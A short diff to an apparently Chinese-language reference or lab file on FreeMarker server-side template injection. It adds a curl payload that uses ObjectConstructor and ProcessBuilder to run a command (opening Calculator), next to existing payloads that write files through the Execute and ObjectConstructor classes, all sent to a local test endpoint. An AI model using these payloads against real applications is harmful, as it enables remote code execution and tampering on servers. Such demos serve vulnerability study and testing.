@@ -219,6 +219,12 @@ curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.Ex
 curl 127.0.0.1:8080/freemarker/eval -d 'username="freemarker.template.utility.ObjectConstructor"?new()("java.io.FileWriter","/tmp/test.txt").append("123").close()'
 ```
 
+执行命令
+
+```
+curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","open","/System/Applications/Calculator.app").start()}'
+```
+
 读文件
 
 ```
